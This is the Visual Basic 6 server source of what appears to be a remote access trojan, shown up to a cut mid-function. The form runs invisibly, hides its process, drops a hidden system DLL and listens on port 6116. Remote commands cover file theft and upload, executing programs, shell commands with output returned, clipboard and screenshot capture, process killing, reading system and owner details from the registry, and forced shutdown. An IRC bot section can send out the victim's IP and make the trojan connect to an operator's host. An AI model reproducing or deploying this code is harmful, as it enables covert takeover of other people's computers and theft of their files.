VERSION 5.00
Begin VB.Form frmServer 
   Appearance      =   0  'Flat
   AutoRedraw      =   -1  'True
   BorderStyle     =   0  'None
   ClientHeight    =   555
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   1515
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   Enabled         =   0   'False
   HasDC           =   0   'False
   Icon            =   "frmServer.frx":0000
   LinkTopic       =   "frmServer"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Moveable        =   0   'False
   NegotiateMenus  =   0   'False
   ScaleHeight     =   37
   ScaleMode       =   3  'Pixel
   ScaleWidth      =   101
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   Begin VB.Timer tmrConnection 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   1020
      Top             =   60
   End
   Begin Server.Socket sckIRC 
      Left            =   540
      Top             =   60
      _ExtentX        =   741
      _ExtentY        =   741
   End
   Begin Server.Socket sckServer 
      Index           =   0
      Left            =   60
      Top             =   60
      _ExtentX        =   741
      _ExtentY        =   741
   End
End
Attribute VB_Name = "frmServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

'ADVAPI32.DLL (Function)
Private Declare Function RegCloseKey Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKeyA Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function OpenProcessToken Lib "ADVAPI32.DLL" (ByVal ProcessHandle As Long, ByVal DesiredAccess As Long, TokenHandle As Long) As Long
Private Declare Function RegQueryValueExA Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function AdjustTokenPrivileges Lib "ADVAPI32.DLL" (ByVal TokenHandle As Long, ByVal DisableAllPrivileges As Long, NewState As TOKEN_PRIVILEGES, ByVal BufferLength As Long, PreviousState As TOKEN_PRIVILEGES, ReturnLength As Long) As Long
Private Declare Function LookupPrivilegeValueA Lib "ADVAPI32.DLL" (ByVal lpSystemName As String, ByVal lpName As String, lpLuid As LUID) As Long

'SHELL32.DLL (Function)
Private Declare Function ShellExecuteA Lib "SHELL32.DLL" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function SHGetFileInfoA Lib "SHELL32.DLL" (ByVal pszPath As String, ByVal dwFileAttributes As Long, psfi As SHFILEINFO, ByVal cbFileInfo As Long, ByVal uFlags As Long) As Long

'KERNEL32.DLL (Sub)
Private Declare Sub RtlMoveMemory Lib "KERNEL32.DLL" (hpvDest As Any, hpvSource As Any, ByVal cbCopy As Long)
Private Declare Sub GlobalMemoryStatus Lib "KERNEL32.DLL" (lpBuffer As MEMORYSTATUS)

'KERNEL32.DLL (Function)
Private Declare Function ReadFile Lib "KERNEL32.DLL" (ByVal hFile As Long, ByVal lpBuffer As String, ByVal nNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, ByVal lpOverlapped As Any) As Long
Private Declare Function FindClose Lib "KERNEL32.DLL" (ByVal hFindFile As Long) As Long
Private Declare Function CreatePipe Lib "KERNEL32.DLL" (phReadPipe As Long, phWritePipe As Long, lpPipeAttributes As Any, ByVal nSize As Long) As Long
Private Declare Function CloseHandle Lib "KERNEL32.DLL" (ByVal hHandle As Long) As Long
Private Declare Function OpenProcess Lib "KERNEL32.DLL" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Function GetTickCount Lib "KERNEL32.DLL" () As Long
Private Declare Function FindNextFileA Lib "KERNEL32.DLL" (ByVal hFindFile As Long, ByRef lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function GetDriveTypeA Lib "KERNEL32.DLL" (ByVal nDrive As String) As Long
Private Declare Function GetVersionExA Lib "KERNEL32.DLL" (lpVersionInformation As OSVERSIONINFO) As Long
Private Declare Function Process32Next Lib "KERNEL32.DLL" (ByVal hSnapShot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function CreateProcessA Lib "KERNEL32.DLL" (ByVal lpApplicationName As Long, ByVal lpCommandLine As String, lpProcessAttributes As SECURITY_ATTRIBUTES, lpThreadAttributes As SECURITY_ATTRIBUTES, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare Function FindFirstFileA Lib "KERNEL32.DLL" (ByVal lpFileName As String, ByRef lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function Process32First Lib "KERNEL32.DLL" (ByVal hSnapShot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function TerminateProcess Lib "KERNEL32.DLL" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
Private Declare Function GetCurrentProcess Lib "KERNEL32.DLL" () As Long
Private Declare Function GetDiskFreeSpaceExA Lib "KERNEL32.DLL" (ByVal lpRootPathName As String, lpFreeBytesAvailableToCaller As Currency, lpTotalNumberOfBytes As Currency, lpTotalNumberOfFreeBytes As Currency) As Long
Private Declare Function GetSystemDirectoryA Lib "KERNEL32.DLL" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetVolumeInformationA Lib "KERNEL32.DLL" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Long) As Long
Private Declare Function RegisterServiceProcess Lib "KERNEL32.DLL" (ByVal dwProcessId As Long, ByVal dwType As Long) As Long
Private Declare Function GetLogicalDriveStringsA Lib "KERNEL32.DLL" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Declare Function CreateToolhelp32Snapshot Lib "KERNEL32.DLL" (ByVal lFlags As Long, ByVal lProcessID As Long) As Long

'USER32.DLL (Function)
Private Declare Function GetDC Lib "USER32.DLL" (ByVal hWnd As Long) As Long
Private Declare Function ShowWindow Lib "USER32.DLL" (ByVal hWnd As Long, ByVal nCmdShow As Long) As Long
Private Declare Function EnumWindows Lib "USER32.DLL" (ByVal lpEnumFunc As Long, ByVal lParam As Long) As Boolean
Private Declare Function FindWindowA Lib "USER32.DLL" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function GetSysColor Lib "USER32.DLL" (ByVal nIndex As Long) As Long
Private Declare Function MessageBoxA Lib "USER32.DLL" (ByVal hWnd As Long, ByVal lpText As String, ByVal lpCaption As String, ByVal wType As Long) As Long
Private Declare Function SetSysColors Lib "USER32.DLL" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long
Private Declare Function ExitWindowsEx Lib "USER32.DLL" (ByVal dwOptions As Long, ByVal dwReserved As Long) As Long
Private Declare Function FindWindowExA Lib "USER32.DLL" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function SwapMouseButton Lib "USER32.DLL" (ByVal bSwap As Long) As Long
Private Declare Function SystemParametersInfoA Lib "USER32.DLL" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long

'GDI32.DLL, ZLIB.DLL, SHLWAPI.DLL, WINMM.DLL (Function)
Private Declare Function BitBlt Lib "GDI32.DLL" (ByVal hDestDC As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal xSrc As Long, ByVal ySrc As Long, ByVal dwRop As Long) As Long
Private Declare Function compress2 Lib "ZLIB.DLL" (dest As Any, destLen As Any, src As Any, ByVal srcLen As Long, ByVal level As Long) As Long
Private Declare Function PathMatchSpecA Lib "SHLWAPI.DLL" (ByVal pszFile As String, ByVal pszSpec As String) As Long
Private Declare Function mciSendStringA Lib "WINMM.DLL" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long

Private Type FILETIME
    dwLowDateTime As Long
    dwHighDateTime As Long
End Type

Private Type LUID
    UsedPart As Long
    IgnoredForNowHigh32BitPart As Long
End Type
      
Private Type MEMORYSTATUS
    dwLength As Long
    dwMemoryLoad As Long
    dwTotalPhys As Long
    dwAvailPhys As Long
    dwTotalPageFile As Long
    dwAvailPageFile As Long
    dwTotalVirtual As Long
    dwAvailVirtual As Long
End Type

Private Type OSVERSIONINFO
    dwOsVersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
End Type

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadID As Long
End Type

Private Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szExeFile As String * 260
End Type

Private Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type

Private Type SHFILEINFO
    hIcon As Long
    iIcon As Long
    dwAttributes As Long
    szDisplayName As String * 260
    szTypeName As String * 80
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As Long
    lpDesktop As Long
    lpTitle As Long
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type TOKEN_PRIVILEGES
    PrivilegeCount As Long
    TheLuid As LUID
    Attributes As Long
End Type

Private Type WIN32_FIND_DATA
    dwFileAttributes As Long
    ftCreationTime As FILETIME
    ftLastAccessTime As FILETIME
    ftLastWriteTime As FILETIME
    nFileSizeHigh As Long
    nFileSizeLow As Long
    dwReserved0 As Long
    dwReserved1 As Long
    cFileName As String * 260
    cAlternate As String * 14
End Type

Private WinVer As Boolean
Private intFile As Integer
Private lngFileSize As Long
Private lngFileProg As Long
Private DefaultColors(4) As Long
Private srchResults As String

Private Sub Form_Load()
    'On Error Resume Next
    Dim SystemPath As String, ZLIBPath As String

    'Exit If Application Already Running
    If App.PrevInstance Then Unload Me
    
    'Find Windows Version (True = 95/98/ME, False = NT/2K/XP)
    WinVer = WinVersion

    'Get System Directory Path
    SystemPath = String$(100, vbNullChar)
    GetSystemDirectoryA SystemPath, 100
    SystemPath = StripNulls(SystemPath)
    
    'Prepare Path
    ZLIBPath = SystemPath & "\zlib.dll"
    
    'Extract File
    If FileExists(ZLIBPath) = False Then ExtractResource "ZLIB.DLL", ZLIBPath
    
    'Set File Attributes
    SetAttr ZLIBPath, vbSystem Or vbHidden
    
    'Hide Process From 95/98/ME
    App.TaskVisible = False
    If WinVer Then RegisterServiceProcess 0, 1
    
    'Wait For Connection
    tmrConnection.Enabled = True
End Sub

Private Sub tmrConnection_Timer()
    'On Error Resume Next
    
    'Check For Connection
    If sckServer(0).LocalIP <> "127.0.0.1" Then
    
        'Turn Off Timer
        tmrConnection.Enabled = False
        
        'Listen For Connections
        sckServer(0).LocalPort = 6116
        sckServer(0).Listen
        
        'Start IRC Bot
        'sckIRC.Connect "irc.zirc.org", 6667
    End If
End Sub

Private Sub sckServer_DataArrival(Index As Integer, ByVal bytesTotal As Long)
    'On Error Resume Next
    Dim strDataParse() As String, strdata As String
    
    'Recieve Data
    sckServer(Index).GetData strdata, vbString
    
    'Parse Command
    strDataParse = Split(strdata, vbParseData)
    Select Case strDataParse(0)
    
        'File Transfer Commands
        
        'Prepare To Send File
        Case "ACPT_FILE": intFile = FreeFile: Open strDataParse(1) For Binary Access Read As intFile: SendReceiveCHNK vbNullString, Index, False
        
        'Send File Chunk
        Case "CHNK_FILE": SendReceiveCHNK vbNullString, Index, False
        
        'Receive File Chunk
        Case "CHNK_DATA": SendReceiveCHNK strdata, Index, True
        
        'Close File
        Case "DONE_FILE": Close intFile
        
        'Request File From Server
        Case "REQU_FILE": sckServer(Index).SendData "SEND_FILE" & vbParseData & FileLen(strDataParse(1))
        
        'Prepare To Receive File
        Case "SEND_FILE": lngFileSize = Int(strDataParse(2)): intFile = FreeFile: If FileExists(strDataParse(1)) Then Kill strDataParse(1): DoEvents
                          Open strDataParse(1) For Binary Access Write As intFile: sckServer(Index).SendData "ACPT_FILE": lngFileProg = 0

        'Open CD-ROM Door
        Case 0: mciSendStringA "Set CDAudio Door Open", vbNull, 0, 0: sckServer(Index).SendData "15"
        
        'Close CD-ROM Door
        Case 1: mciSendStringA "Set CDAudio Door Closed", vbNull, 0, 0: sckServer(Index).SendData "15"
        
        'Restore Mouse Buttons
        Case 2: SwapMouseButton False: sckServer(Index).SendData "15"
        
        'Swap Mouse Buttons
        Case 3: SwapMouseButton True: sckServer(Index).SendData "15"
        
        'Execute File
        Case 4: ShellExecuteA Me.hWnd, "Open", strDataParse(1), vbNullString, vbNullString, 1: sckServer(Index).SendData "15"
        
        'Delete Directory
        Case 5: RmDir strDataParse(1): sckServer(Index).SendData "8"
        
        'Create Directory
        Case 6: MkDir strDataParse(1): sckServer(Index).SendData "8"
        
        'Set Clipboard Text
        Case 7: Clipboard.SetText strDataParse(1): sckServer(Index).SendData "15"
        
        'Send Clipboard Text
        Case 8: sckServer(Index).SendData "0" & vbParseData & Clipboard.GetText
        
        'Set Time/Date
        Case 9: Time = Format$(strDataParse(1), "hh:mm:ss AMPM"): Date = Format$(strDataParse(2), "mm/dd/yy"): sckServer(Index).SendData "15"
        
        'Send Time/Date
        Case 10: sckServer(Index).SendData "1" & vbParseData & Format$(Now, "hh:mm:ss AMPM mm/dd/yy")
        
        'Hide Taskbar
        Case 11: ShowWindow FindWindowA("Shell_TrayWnd", vbNullString), 0: sckServer(Index).SendData "15"
        
        'Show Taskbar
        Case 12: ShowWindow FindWindowA("Shell_TrayWnd", vbNullString), 1: sckServer(Index).SendData "15"
        
        'Hide Desktop
        Case 13: ShowWindow FindWindowA("Progman", vbNullString), 0: sckServer(Index).SendData "15"
        
        'Show Desktop
        Case 14: ShowWindow FindWindowA("Progman", vbNullString), 1: sckServer(Index).SendData "15"
        
        'Shutdown, Restart, Logoff
        Case 15: sckServer(Index).SendData "15": DoEvents: ForceBootOff strDataParse(1)
    
        'Case 16:
        
        'Case 17:
        
        'Retrieve DOS Output
        Case 18: sckServer(Index).SendData "2" & vbParseData & DOSOutput(strDataParse(1))
        
        'Send Process List
        Case 19: sckServer(Index).SendData "3" & vbParseData & GetProc
        
        'Delete File
        Case 20: Kill strDataParse(1): sckServer(Index).SendData "8"
        
        'Set Wallpaper
        Case 21: SystemParametersInfoA 20, 0, strDataParse(1), 0: sckServer(Index).SendData "15"
        
        'Hide Start Button
        Case 22: ShowWindow FindWindowExA(FindWindowA("Shell_TrayWnd", vbNullString), 0, "Button", vbNullString), 0: sckServer(Index).SendData "15"
        
        'Show Start Button
        Case 23: ShowWindow FindWindowExA(FindWindowA("Shell_TrayWnd", vbNullString), 0, "Button", vbNullString), 5: sckServer(Index).SendData "15"
        
        'Hide System Clock
        Case 24: ShowWindow FindWindowExA(FindWindowExA(FindWindowA("Shell_TrayWnd", vbNullString), 0, "TrayNotifyWnd", vbNullString), 0, "TrayClockWClass", vbNullString), 0: sckServer(Index).SendData "15"
        
        'Show System Clock
        Case 25: ShowWindow FindWindowExA(FindWindowExA(FindWindowA("Shell_TrayWnd", vbNullString), 0, "TrayNotifyWnd", vbNullString), 0, "TrayClockWClass", vbNullString), 5: sckServer(Index).SendData "15"
        
        'Set System Colors
        Case 26: SetSystemColors strDataParse(1): sckServer(Index).SendData "15"
        
        'Send System Colors
        Case 27: sckServer(Index).SendData "4" & vbParseData & GetSysColor(4) & vbParseData & GetSysColor(5) & vbParseData & GetSysColor(7) & vbParseData & GetSysColor(8) & vbParseData & GetSysColor(15)
        
        'Restore System Default Colors
        Case 28: SetSystemColors "Restore": sckServer(Index).SendData "15"
        
        'Send Directory List
        Case 29: sckServer(Index).SendData "5" & vbParseData & GetDirectory(strDataParse(1))
        
        'Send Drive List
        Case 30: sckServer(Index).SendData "6" & vbParseData & GetDrives
        
        'Rename File
        Case 31: Name strDataParse(1) As strDataParse(2): sckServer(Index).SendData "8"
        
        'Send File Properties
        Case 32: sckServer(Index).SendData "7" & vbParseData & Properties(strDataParse(1), True)
        
        'Send Drive Properties
        Case 33: sckServer(Index).SendData "9" & vbParseData & Properties(strDataParse(1), False)
        
        'Terminate Process
        Case 34: TerminateProcess OpenProcess(2035711, 1, strDataParse(1)), 0: DoEvents: sckServer(Index).SendData "10"
        
        'Search For Files
        Case 35: FileSearch strDataParse(1), strDataParse(2): sckServer(Index).SendData "5" & vbParseData & srchResults: srchResults = vbNullString
        
        'Send PC Information
        Case 36: sckServer(Index).SendData "11" & vbParseData & PCInformation
        
        'Take & Send Screenshot
        Case 37: sckServer(Index).SendData "12" & vbParseData & TakeScreenShot(strDataParse(1))
        
        'Show Message Box
        Case 38: MessageBoxA Me.hWnd, strDataParse(1), strDataParse(3), strDataParse(2): sckServer(Index).SendData "15"
        
        'Send Window List
        Case 39: EnumWindows AddressOf EnumWindowsProc, vbNull: sckServer(Index).SendData "13" & vbParseData & strWindows: strWindows = vbNullString
        
        'Hide, Show, Minimize, Maximize, Restore Window
        Case 40: ShowWindow strDataParse(1), strDataParse(2): sckServer(Index).SendData "15"
        
    End Select
    
    'Free Array
    Erase strDataParse
End Sub

Private Sub sckIRC_DataArrival(ByVal bytesTotal As Long)
    'On Error Resume Next
    Dim I As Integer, UserName As String, strdata As String, strDataParse() As String, strCommand() As String
    
    'Recieve Data
    sckIRC.GetData strdata, vbString
    
    'PING Response
    If Left$(strdata, 4) = "PING" Then sckIRC.SendData "PONG " & Split(strdata, Space$(1))(1) & vbNewLine: Exit Sub
    
    'Parse Data
    strDataParse = Split(strdata, vbNewLine)
    
    'Parse IRC Command
    For I = 0 To UBound(strDataParse) - 1
        strCommand = Split(strDataParse(I), Space$(1))
        If UBound(strCommand) > 0 Then
            Select Case strCommand(1)
            
                'Connected To IRC Server (JOIN CHANNEL)
                Case "001": sckIRC.SendData "JOIN #alpha-beta-gamma" & vbNewLine: Exit For
                    
                'Check Private Message
                Case "PRIVMSG"
                    Select Case LCase$(Right$(strCommand(3), Len(strCommand(3)) - 1))
                    
                        '@op [CHANNEL] [USER] - Bot Gives OP Privillage To [USER] In [CHANNEL]
                        Case "@op": sckIRC.SendData "MODE " & strCommand(4) & " +o " & strCommand(5) & vbNewLine
                        
                        '@ip - Bot Sends IP Through PRIVMSG To UserName
                        Case "@ip": UserName = Split(strCommand(0), "!")(0): UserName = Right$(UserName, Len(UserName) - 1): sckIRC.SendData "PRIVMSG " & UserName & " :" & sckIRC.LocalIP & vbNewLine
                        
                        '@join [CHANNEL] - Bot Joins [CHANNEL]
                        Case "@join": sckIRC.SendData "JOIN " & strCommand(4) & vbNewLine
                        
                        '@part [CHANNEL] - Bot Parts [CHANNEL]
                        Case "@part": sckIRC.SendData "PART " & strCommand(4) & vbNewLine
                        
                        '@quit - Bot Quits IRC Server
                        Case "@quit": sckIRC.SendData "QUIT" & vbNewLine
                        
                        '@connect [IP ADDRESS] - Server Connects To [IP ADDRESS]
                        Case "@connect": RouterBypass strCommand(4), strCommand(5)
                        
                        Case Else: Exit For
                    End Select
                    Exit For
            End Select
        End If
    Next I
    
    'Free Arrays
    Erase strDataParse
    Erase strCommand
End Sub

Private Sub sckIRC_Connect()
    'On Error Resume Next
    
    'Send IRC Server User Information
    sckIRC.SendData "USER " & sckIRC.LocalHostName & " " & sckIRC.LocalHostName & " " & sckIRC.LocalHostName & " :" & sckIRC.LocalHostName & vbNewLine
    
    'Send IRC Server Nickname
    sckIRC.SendData "NICK " & sckIRC.LocalHostName & vbNewLine
End Sub

Private Sub sckServer_ConnectionRequest(Index As Integer, ByVal requestID As Long)
    'On Error Resume Next
    Dim I As Integer, intReq As Integer
    
    'Checks For Unused Socket
    intReq = sckServer.UBound
    For I = 1 To intReq
        If sckServer(I).State <> 7 Then
        
            'Clear Socket Status
            sckServer(I).CloseSck
            
            'Accepting Connection On Unused Socket
            sckServer(I).Accept requestID
            
            Exit Sub
        End If
        DoEvents
    Next
    
    'Create New Socket
    Load sckServer(intReq + 1)
    
    'Accepting Connection On New Socket
    sckServer(intReq + 1).Accept requestID
End Sub

Private Sub RouterBypass(ByVal strIP As String, ByVal strPort As String)
    'On Error Resume Next
    Dim I As Integer, intReq As Integer
    
    'Checks For Unused Socket
    intReq = sckServer.UBound
    For I = 1 To intReq
        If sckServer(I).State <> 7 Then
        
            'Clear Socket Status
            sckServer(I).CloseSck
            
            'Connecting On Unused Socket
            sckServer(I).Connect strIP, strPort
            
            Exit Sub
        End If
        DoEvents
    Next
    
    'Create New Socket
    Load sckServer(intReq + 1)
    
    'Connecting On New Socket
    sckServer(intReq + 1).Connect strIP, strPort
End Sub

Private Sub SendReceiveCHNK(ByVal strdata As String, ByVal Index As Integer, ByVal SendRecieve As Boolean)
    'On Error Resume Next
    Dim FileBuffer As String
    
    'Send-Recieve File (True = Receiving, False = Sending)
    If SendRecieve Then
    
        'Parse Out File Data From Command
        strdata = Mid$(strdata, 11, Len(strdata) - 10)
        
        'Check File Length
        If (lngFileProg + 4096) < lngFileSize Then
        
            'Change File Length
            lngFileProg = lngFileProg + 4096
            
            'Add To Incomplete File
            Put intFile, , strdata
            
            'Request New File Chunk
            sckServer(Index).SendData "CHNK_FILE"
            
        Else
            
            'Add To Complete File
            strdata = Left$(strdata, lngFileSize - lngFileProg)
            Put intFile, , strdata
            
            'Tell Client File Recieved
            sckServer(Index).SendData "DONE_FILE"
            
            'Close Complete File
            Close intFile
            
        End If
    Else
    
        'Send Data To Client
        FileBuffer = String$(4096, vbNullChar)
        
        'Get File Chunk
        Get intFile, , FileBuffer
        
        'Send File Chunk
        sckServer(Index).SendData "CHNK_DATA" & vbParseData & FileBuffer
        
    End If
End Sub

Private Sub AdjustToken()
    'On Error Resume Next
    Dim hdlProcessHandle As Long, hdlTokenHandle As Long, tmpLuid As LUID, tkp As TOKEN_PRIVILEGES, tkpNewButIgnored As TOKEN_PRIVILEGES, lBufferNeeded As Long
    
    'Find Current Process
    hdlProcessHandle = GetCurrentProcess()
    
    'Prepare To Change Program Privilege
    OpenProcessToken hdlProcessHandle, (32 Or 8), hdlTokenHandle
    LookupPrivilegeValueA "", "SeShutdownPrivilege", tmpLuid
    
    'Set Variables
    tkp.PrivilegeCount = 1
    tkp.TheLuid = tmpLuid
    tkp.Attributes = 2
    
    'Change Program Privilege
    AdjustTokenPrivileges hdlTokenHandle, False, tkp, Len(tkpNewButIgnored), tkpNewButIgnored, lBufferNeeded
End Sub

Private Sub ForceBootOff(ByVal strFunction As Integer)
    'On Error Resume Next
    
    'Check Windows Version
    If WinVer = False Then

        'Allow Shutdown/Logoff/Restart On NT/2K/XP
        If strFunction Then AdjustToken
    End If
    
    'Logoff = 0, Shutdown = 1, Restart = 2
    ExitWindowsEx (strFunction Or 4), &HFFFF
End Sub

Private Function GetProc() As String
    'On Error Resume Next
    Dim proc As PROCESSENTRY32, snap As Long, ret As Integer
    
    'Set Variables
    snap = CreateToolhelp32Snapshot(15, 0)
    proc.dwSize = Len(proc)
    
    'Find First Process
    Process32First snap, proc
    
    'Find All Process's
    Do
    
        'Add Process To List
        GetProc = GetProc & StripNulls(proc.szExeFile) & vbParseData & proc.th32ProcessID & vbParseData
        
        'Find Next Process
        ret = Process32Next(snap, proc)
        
        DoEvents
    Loop While ret <> 0
    
    'Free Handle
    CloseHandle snap
End Function

Private Function StripNulls(ByVal OriginalStr As String) As String
    'On Error Resume Next
    
    'Delete vbNullChar's From OriginalStr
    StripNulls = Left$(OriginalStr, InStr(OriginalStr, vbNullChar) - 1)
End Function

Private Sub FileSearch(ByVal sRoot As String, ByVal sFileEXT As String)
    'On Error Resume Next
    Dim WFD As WIN32_FIND_DATA, hFile As Long
    
    'Find First File
    hFile = FindFirstFileA(sRoot & "*.*", WFD)
    
    'Check If Directory Exists
    If hFile <> -1 Then
    
        'Find All Files In sRoot With sFileEXT In There Name
        Do
        
            'Check If Directory Or File
            If (WFD.dwFileAttributes And vbDirectory) Then
            
                'Search Within Directory
                If AscW(WFD.cFileName) <> 46 Then FileSearch sRoot & StripNulls(WFD.cFileName) & "\", sFileEXT
                
            Else
            
                'Add File To srchResults
                If PathMatchSpecA(WFD.cFileName, sFileEXT) Then srchResults = srchResults & sRoot & StripNulls(WFD.cFileName) & vbParseData
            
            End If
            DoEvents
            
        'Find Next File
        Loop While FindNextFileA(hFile, WFD)
    End If
    
    'Free Handle
    FindClose hFile
End Sub

Private Function GetDirectory(ByVal Path As String) As String
    'On Error Resume Next
    Dim WFD As WIN32_FIND_DATA, hFile As Long, tmpString As String, Directory As String, File As String
    
    'Find First File
    hFile = FindFirstFileA(Path & "*.*", WFD)
    
    'Check If Directory Exists
    If hFile <> -1 Then
    
        'Find All Files In Path
        Do
        
            tmpString = StripNulls(WFD.cFileName)
            
            'Check If Directory Or File
            If (WFD.dwFileAttributes And vbDirectory) Then
            
                'Directory
                If AscW(WFD.cFileName) <> 46 Then Directory = Directory & ChrW$(2) & tmpString & vbParseData
            
            Else
            
                'File
                File = File & tmpString & vbParseData
                
            End If
            DoEvents
            
        'Find Next File
        Loop While FindNextFileA(hFile, WFD)
    End If
    
    'Combine Directory And File List
    GetDirectory = Directory & File

    'Free Handle
    FindClose hFile
End Function

Private Function GetDrives() As String
    'On Error Resume Next
    Dim strdata As String, strDataParse() As String, I As Integer
    
    'Get List Of All Logical Drives
    strdata = String(104, vbNullChar)
    GetLogicalDriveStringsA 104, strdata
    
    'Parse Drive List
    strDataParse = Split(strdata, vbNullChar)
    For I = 0 To UBound(strDataParse) - 1
    
        'Identify Drive Type
        If LenB(strDataParse(I)) Then
            Select Case GetDriveTypeA(strDataParse(I))
                Case 1: GetDrives = GetDrives & UCase$(strDataParse(I)) & " - Absent Drive" & vbParseData
                Case 2: GetDrives = GetDrives & UCase$(strDataParse(I)) & " - Removable Disk" & vbParseData
                Case 3: GetDrives = GetDrives & UCase$(strDataParse(I)) & " - Hard Disk" & vbParseData
                Case 4: GetDrives = GetDrives & UCase$(strDataParse(I)) & " - Network Drive" & vbParseData
                Case 5: GetDrives = GetDrives & UCase$(strDataParse(I)) & " - Compact Disk" & vbParseData
                Case 6: GetDrives = GetDrives & UCase$(strDataParse(I)) & " - Ramdisk Drive" & vbParseData
                Case Else: GetDrives = GetDrives & UCase$(strDataParse(I)) & " - Unknown Drive" & vbParseData
            End Select
            DoEvents
        End If
    Next I
    
    'Free Array
    Erase strDataParse
End Function

Private Function Properties(ByVal strFileName As String, ByVal FileFolder As Boolean) As String
    'On Error Resume Next
    
    'Check If File Or Folder
    If FileFolder Then
        Dim FI As SHFILEINFO
        
        'Find File Information
        SHGetFileInfoA strFileName, 0, FI, Len(FI), 512 Or 1024
        
        'Parse File Information
        Properties = StripNulls(FI.szTypeName) & vbParseData & FileLen(strFileName) & vbParseData & (GetAttr(strFileName) And 1) & vbParseData & (GetAttr(strFileName) And 2) & vbParseData & (GetAttr(strFileName) And 4)
    
    Else
        Dim TotalFreeBytes As Currency, TotalBytes As Currency, VName As String, FSName As String
        
        'Prepare Variables
        VName = String$(255, vbNullChar): FSName = String$(255, vbNullChar)
        
        'Get Free Disk Space
        GetDiskFreeSpaceExA strFileName, 0, TotalBytes, TotalFreeBytes
        
        'Find Drive Information
        GetVolumeInformationA strFileName, VName, 255, 0, 0, 0, FSName, 255
        
        'Parse Drive Information
        Properties = StripNulls(VName) & vbParseData & StripNulls(FSName) & vbParseData & TotalBytes * 10000 & vbParseData & TotalFreeBytes * 10000
    
    End If
End Function

Private Function PCInformation() As String
    'On Error Resume Next
    Dim MemInfo As MEMORYSTATUS, WinID As String
    
    'Get Physical Memory Status
    GlobalMemoryStatus MemInfo
    
    'Registry Value Depending On Windows Version
    WinID = IIf(WinVer, "SOFTWARE\Microsoft\Windows\CurrentVersion", "SOFTWARE\Microsoft\Windows NT\CurrentVersion")
    
    'Retrieve Needed Registry Keys
    PCInformation = GetStringKey(-2147483646, WinID, "ProductName") & vbParseData & GetStringKey(-2147483646, WinID, "RegisteredOwner") & vbParseData & GetStringKey(-2147483646, WinID, "RegisteredOrganization") & vbParseData & GetStringKey(-2147483646, WinID, "ProductID") & vbParseData & GetStringKey(-2147483646, "HARDWARE\DESCRIPTION\System\CentralProcessor\0", IIf(WinVer, "Identifier", "ProcessorNameString")) & vbParseData & MemInfo.dwAvailPhys & vbParseData & MemInfo.dwTotalPhys & vbParseData & Screen.Width / Screen.TwipsPerPixelX & vbParseData & Screen.Height / Screen.TwipsPerPixelY & vbParseData & GetTickCount
End Function

Private Function WinVersion() As Boolean
    'On Error Resume Next
    Dim vInfo As OSVERSIONINFO
    
    'Prepare Variable
    vInfo.dwOsVersionInfoSize = Len(vInfo)
    
    'Find Windows Version
    If GetVersionExA(vInfo) <> 0 Then If vInfo.dwPlatformId = 1 Then WinVersion = True
End Function

Private Function GetStringKey(ByVal hKey As Long, ByVal strPath As String, ByVal strValue As String) As String
    'On Error Resume Next
